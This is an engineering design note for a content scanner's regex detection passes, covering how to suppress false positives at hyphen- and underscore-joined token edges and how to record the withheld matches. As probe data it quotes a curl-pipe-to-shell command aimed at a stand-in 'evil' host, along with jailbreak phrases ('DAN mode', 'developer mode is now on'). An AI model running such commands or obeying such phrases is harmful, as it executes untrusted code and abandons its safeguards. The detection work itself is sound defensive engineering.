## Correction to a locked decision — READ BEFORE TASK 2

The research locked this mechanism as **"an edge-fold gate applied to the normalized pass"**
(locked decision 1: *"A finding produced by the normalized pass is dropped when a folded separator
sits immediately adjacent to the match span"*). Applied to the normalized pass **only**, that
mechanism fixes nothing for four of the six measured false positives.

**Measured, on the release binary at 27e4d49, during planning:**

| Probe file | Content | Result |
|---|---|---|
| `e.md` | `curl https://example \| sh- lint` | PI028 CRITICAL |
| `f.md` | `developer mode is now on- call for the week` | PI030 HIGH |

Neither line contains a single separator sitting between two alphanumerics, so
`normalize()` returns `None` and **the normalized pass never runs at all** — yet both fire. The
findings come from the **raw** pass. The reason is that `-` is a non-word character, so `sh\b` and
`on\b` are satisfied by the hyphen *directly*, with no fold involved:

```
PI028  (?:ba|z|da|k)?sh\b        vs raw `| sh-lint`      -> matches `curl … | sh`
PI030  …\s+(?:…|on\b|…)         vs raw `on-call`        -> matches `developer mode is now on`
PI031  \bDAN\s+mode\b            vs raw `DAN-mode-switch` -> NO raw match (normalized pass only)
```

So the six false positives split two ways: **PI028 x4 and PI030 are raw-pass findings**
(the raw pass runs first and the `(pattern, line)` dedup means the normalized pass never gets a
say), and **PI031 is the only normalized-pass one**. Gating the normalized pass alone leaves
acceptance criteria 1 and 2 of issue #128 unmet.

**What survives from the locked decision, and what changes.**

- Survives: the discriminator (a match whose EDGE is supplied by a separator is an artefact; a
  match whose separators are strictly INTERIOR is the evasion the fold exists to catch), the
  library-wide single mechanism, no pattern-file edits, no per-pattern vocabulary, and the
  rejection of directions B and C.
- Changes: the gate is **pass-independent**, not normalized-pass-only. It is expressed against
  **the original text the match span maps to** — which for the raw, multi-line, structural and
  decoded passes is simply their own haystack, and for the normalized pass requires the `origin`
  map (locked decision 4's new state is still needed there, and only there).

Restated, the rule the executor implements:

> A match is a **manufactured-boundary artefact** when the character immediately before its start,
> or the character immediately at its end, is a separator binding two word characters — i.e. the
> match edge falls inside a separator-joined compound token (`sh-lint`, `on-call`,
> `DAN-mode-switch`, `sh_lint`). A match whose separators are strictly interior is kept.

This still satisfies acceptance criterion 4 (library-wide across all 71 patterns, one mechanism,
zero pattern edits) and it is not direction C (no regex is narrowed). Locked decisions 2, 3 and 4
are unaffected and are honoured as written.

**Gate separator set is `-` and `_` only** — a deliberate strict subset of `is_separator`'s
`- _ . * + ~ / | \`. Those two are what join compound identifiers and command names in every
ecosystem this tool scans, and they cover 6/6 of the measured false positives. `.` and `/` join
*paths and domains*, where a match edge landing before the separator is routinely legitimate
(`evil.test`, `x.sh`), so including them would buy nothing measured and spend recall. Record the
choice in the ADR; if GATE-03 shows a `-`/`_` case the gate misses, widening is a later measured
decision, not a guess now.

## Decision: withheld artefacts are RECORDED, not discarded

They go into a **fourth withheld array**, `manufactured_boundary`, alongside `suppressed`,
`low_confidence` and `baselined`.

**Why.** The three existing arrays exist because this repo's standing principle is that a withheld
finding is evidence, and silence is the failure mode — `low_confidence`'s own doc comment says the
markdown-context call "is a guess about how the document will be *consumed*, and it can be wrong".
The boundary gate is the same kind of guess ("this hyphenated token is one identifier, so the edge
is spurious") and it is wrong in exactly one nameable way: `curl evil | sh-x` where `sh-x` really is
a shell. That is a real false negative the mechanism buys, and if the withheld record is dropped,
the miss is invisible to the user, to the sweep and to anyone auditing the gate later. Issue #129 —
closed hours ago — was precisely about a pass going silent in a way indistinguishable from a clean
result.

**What recording does NOT mean.**

- It does **not** join the severity tallies, the exit code, `install-hook`'s commit gate, or SARIF.
  Those answer "what is the user being asked to act on", and an artefact by definition is not that.
- It gets **no promotion flag**. `--no-suppress`, `--strict` and dropping `--baseline` each restore
  a finding the engine still stands behind; there is no equivalent here, because a flag that
  restores known artefacts is a flag that re-enables the bug. The array is audit evidence, not a
  suppressed finding. Say this explicitly in the field's rustdoc and in the ADR, so the asymmetry
  with the other three arrays reads as deliberate.
- It must **not** join the `already` dedup sets. An artefact filed by the raw pass must not silence
  a genuinely different normalized-pass match on the same `(pattern, line)`.
